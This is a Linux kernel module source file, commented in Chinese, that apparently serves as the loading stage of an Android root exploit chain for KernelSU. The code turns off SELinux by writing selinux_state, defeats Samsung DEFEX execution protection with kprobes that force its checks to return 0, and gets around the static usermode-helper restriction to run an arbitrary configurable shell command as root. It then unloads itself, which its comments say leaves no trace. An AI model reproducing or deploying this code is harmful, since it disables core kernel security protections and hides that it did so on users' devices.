/* ksu_min_load.c — 极简内核装载器 v2（原创实现；替代 ksud 的进程风暴）
 * ──────────────────────────────────────────────────────────────────────────────
 * v1 实测动机（2026-10-06）：exploit 走到装载段会拉起 ksud ⇒ 进程风暴把内核
 *   workqueue 饿死 ⇒ 厂商内核 panic（"BUG: workqueue lockup ... stuck for 49s"）；
 *   绕开 ksud 的那一发 crash.log 归零 ⇒ 风暴就是触发源。v1 只做三件事：
 *   kprobe 自举 kallsyms_lookup_name → selinux_state=false → umh 跑一句 insmod。
 *
 * v2 增强（全部运行时解析；任一环节失败只跳过该环节，绝不让 init 整体失败）：
 *   ① 页缓存清理（可选段）：kern_path + invalidate_inode_pages2 + path_put 三个
 *      符号齐全才做；对 cache_path（默认 /system/bin/sh 这个文件本身）丢页缓存 ⇒
 *      随后 umh exec 到的是盘上真实内容而非旧缓存页。
 *   ② DEFEX 兼容层：三星内核在 execve 路径上挂 task_defex_enforce /
 *      task_defex_user_exec 做"防执行"。用 kprobe 挂住它们，pre_handler 模拟
 *      "立即返回 0"：x0=0（返回值）+ pc=x30(LR) + 返回 1（让 kprobe 框架跳过
 *      单步）。非三星内核这两个符号不存在 ⇒ register_kprobe 报错 ⇒ 只 pr_info
 *      不算错；自卸载前反注册。
 *   ③ 绕 CONFIG_STATIC_USERMODEHELPER：call_usermodehelper_setup() 之后把返回的
 *      struct subprocess_info.path（定义在 <linux/umh.h>）强制改回我们的解释器，
 *      否则静态 umh 配置下 exec 的会是厂商钉死的那个 path。
 *   ④ UMH 命令可配：module_param char *umh_cmd，执行固定为
 *      /system/bin/sh -c <umh_cmd>；若 umh_cmd 自带 "/system/bin/sh -c " 前缀
 *      则剥掉再拼，两种写法都能用（insmod 交给脚本自己跑，本模块不再硬编码）。
 *   ⑤ 进度标记：umh 前后各 touch 一个标记（/dev/dfm0 开始 / /dev/dfm1 完成），
 *      内核直写 filp_open(O_CREAT) 实现，不额外拉进程；失败不打紧。
 * 每阶段 pr_info("ksu_minload: ...")；最后 return -E2BIG 让内核把本模块卸载
 * （init 返回非 0 即卸载，-E2BIG 是我们约定的"干完活"标记）。
 */
#include <linux/dcache.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/ptrace.h>
#include <linux/umh.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("minimal KernelSU late-loader v2 (page-cache flush + DEFEX shim + static-umh bypass)");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
/* 页缓存段专用（运行时解析，不直接引用内核符号） */
typedef int (*kern_path_t)(const char *pathname, unsigned flags, struct path *path);
typedef int (*invalidate_inode_pages2_t)(struct address_space *mapping);
typedef void (*path_put_t)(struct path *path);

/* ★ 模块参数：UMH 命令与页缓存目标，换弹药不重编 */
static char *umh_cmd = "/data/local/tmp/late_load.sh";
module_param(umh_cmd, charp, 0);
MODULE_PARM_DESC(umh_cmd, "command run as: /system/bin/sh -c <umh_cmd> (a leading \"/system/bin/sh -c \" is stripped)");

static char *cache_path = "/system/bin/sh";
module_param(cache_path, charp, 0);
MODULE_PARM_DESC(cache_path, "file whose page cache is invalidated before the umh exec");

static const char sh_path[] = "/system/bin/sh";
static char *envp[] = { "PATH=/system/bin", NULL };

/* ── ② DEFEX 兼容层 ──────────────────────────────────────────────────────────
 * pre_handler 模拟"被钩函数立即返回 0"：arm64 调用约定返回值在 x0、返回地址在
 * x30(LR)。把 pc 改成 x30 并返回 1，kprobe 框架就不单步原指令、直接回调用者。
 */
static int defex_shim(struct kprobe *p, struct pt_regs *regs)
{
#if defined(CONFIG_ARM64)
    regs->regs[0] = 0;          /* x0 = 0 ⇒ 被钩函数"返回 0"（放行） */
    regs->pc = regs->regs[30];  /* pc = x30(LR) ⇒ 立即返回调用者 */
    return 1;                   /* 跳过原指令的单步执行 */
#else
    (void)p;
    (void)regs;
    return 0;                   /* 非 arm64 构建：不干预 */
#endif
}

static struct kprobe defex_kp_enforce;
static struct kprobe defex_kp_userexec;

/* ── ⑤ 进度标记：内核直写，不拉进程 ────────────────────────────────────────── */
static void mark(const char *path)
{
    struct file *f = filp_open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    if (IS_ERR(f)) {
        pr_info("ksu_minload: marker %s failed (%ld)\n", path, PTR_ERR(f));
        return;
    }
    filp_close(f, NULL);
    pr_info("ksu_minload: marker %s ok\n", path);
}

static int __nocfi __init ksu_min_load_init(void)
{
    kallsyms_lookup_name_t get_addr;
    umh_setup_t umh_setup;
    umh_exec_t umh_exec;
    kern_path_t kern_path_fn;
    invalidate_inode_pages2_t inval_fn;
    path_put_t path_put_fn;
    bool *selinux_state;
    struct kprobe kln_kp;
    void *info;
    char *argv_sh[4];
    const char *cmd = umh_cmd;
    size_t sh_len = sizeof(sh_path) - 1;
    bool armed_enforce = false, armed_userexec = false;
    int ret;

    /* ① 自举：拿 kallsyms_lookup_name */
    memset(&kln_kp, 0, sizeof(kln_kp));
    kln_kp.symbol_name = "kallsyms_lookup_name";
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("ksu_minload: kallsyms_lookup_name not found, abort\n");
        return -E2BIG;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);
    pr_info("ksu_minload: kallsyms_lookup_name @ %px\n", (void *)get_addr);

    /* ② permissive（拿到就设，拿不到不致命） */
    selinux_state = (bool *)get_addr("selinux_state");
    if (selinux_state) {
        WRITE_ONCE(*selinux_state, false);
        pr_info("ksu_minload: selinux_state -> permissive\n");
    } else {
        pr_info("ksu_minload: selinux_state not found (skip)\n");
    }

    /* ③ DEFEX 兼容层：符号不存在（非三星内核）只 pr_info，不算错 */
    memset(&defex_kp_enforce, 0, sizeof(defex_kp_enforce));
    defex_kp_enforce.symbol_name = "task_defex_enforce";
    defex_kp_enforce.pre_handler = defex_shim;
    ret = register_kprobe(&defex_kp_enforce);
    if (ret == 0) {
        armed_enforce = true;
        pr_info("ksu_minload: DEFEX shim armed on task_defex_enforce\n");
    } else {
        pr_info("ksu_minload: task_defex_enforce absent (ret=%d), no DEFEX kernel (skip)\n", ret);
    }

    memset(&defex_kp_userexec, 0, sizeof(defex_kp_userexec));
    defex_kp_userexec.symbol_name = "task_defex_user_exec";
    defex_kp_userexec.pre_handler = defex_shim;
    ret = register_kprobe(&defex_kp_userexec);
    if (ret == 0) {
        armed_userexec = true;
        pr_info("ksu_minload: DEFEX shim armed on task_defex_user_exec\n");
    } else {
        pr_info("ksu_minload: task_defex_user_exec absent (ret=%d) (skip)\n", ret);
    }

    /* ①(可选段) 页缓存清理：三个符号齐全才做，缺一个整段跳过 */
    kern_path_fn = (kern_path_t)get_addr("kern_path");
    inval_fn     = (invalidate_inode_pages2_t)get_addr("invalidate_inode_pages2");
    path_put_fn  = (path_put_t)get_addr("path_put");
    if (!kern_path_fn || !inval_fn || !path_put_fn) {
        pr_info("ksu_minload: page-cache symbols missing (kern_path=%px inval=%px path_put=%px) (skip)\n",
                (void *)kern_path_fn, (void *)inval_fn, (void *)path_put_fn);
    } else {
        struct path ppath;

        if (kern_path_fn(cache_path, LOOKUP_FOLLOW, &ppath) == 0) {
            struct inode *ino = d_inode(ppath.dentry);

            if (ino && ino->i_mapping) {
                ret = inval_fn(ino->i_mapping);
                pr_info("ksu_minload: page-cache invalidated for %s -> %d\n", cache_path, ret);
            } else {
                pr_info("ksu_minload: %s has no inode/mapping (skip)\n", cache_path);
            }
            path_put_fn(&ppath);
        } else {
            pr_info("ksu_minload: kern_path(%s) failed (skip)\n", cache_path);
        }
    }

    /* ④ 归一化命令：剥掉可选的 "/system/bin/sh -c " 前缀，两种写法都兼容 */
    if (!strncmp(cmd, sh_path, sh_len) &&
        (cmd[sh_len] == ' ' || cmd[sh_len] == '\t' || cmd[sh_len] == '\0')) {
        cmd += sh_len;
        while (*cmd == ' ' || *cmd == '\t')
            cmd++;
        if (cmd[0] == '-' && cmd[1] == 'c') {
            cmd += 2;
            while (*cmd == ' ' || *cmd == '\t')
                cmd++;
        }
    }
    pr_info("ksu_minload: umh will run %s -c '%s'\n", sh_path, cmd);

    /* ⑤ 开始标记（失败不打紧） */
    mark("/dev/dfm0");

    /* ⑥ umh：setup → 强改 path（绕 CONFIG_STATIC_USERMODEHELPER）→ exec */
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("ksu_minload: umh symbols missing (setup=%px exec=%px)\n",
               (void *)umh_setup, (void *)umh_exec);
    } else {
        argv_sh[0] = (char *)sh_path;
        argv_sh[1] = (char *)"-c";
        argv_sh[2] = (char *)cmd;
        argv_sh[3] = NULL;

        info = umh_setup(sh_path, argv_sh, envp, GFP_KERNEL, NULL, NULL, NULL);
        if (!info) {
            pr_err("ksu_minload: umh_setup returned NULL\n");
        } else {
            /* 绕 CONFIG_STATIC_USERMODEHELPER：setup 之后把 path 钉回我们的解释器 */
            ((struct subprocess_info *)info)->path = (char *)sh_path;
            ret = umh_exec(info, UMH_WAIT_PROC);
            pr_info("ksu_minload: umh exec -> %d\n", ret);
        }
    }

    /* ⑤ 完成标记（失败不打紧） */
    mark("/dev/dfm1");

    /* ⑦ 自卸载前反注册 DEFEX shim（此时 insmod 已同步完成，shim 使命结束） */
    if (armed_enforce) {
        unregister_kprobe(&defex_kp_enforce);
        pr_info("ksu_minload: DEFEX shim removed from task_defex_enforce\n");
    }
    if (armed_userexec) {
        unregister_kprobe(&defex_kp_userexec);
        pr_info("ksu_minload: DEFEX shim removed from task_defex_user_exec\n");
    }

    pr_info("ksu_minload: done, self-unloading (-E2BIG)\n");
    return -E2BIG;   /* init 返回非 0 ⇒ 内核卸载本模块（不留痕迹） */
}

/* 没有 module_exit：我们从不走正常卸载路径，省掉 .exit 段 */
module_init(ksu_min_load_init);
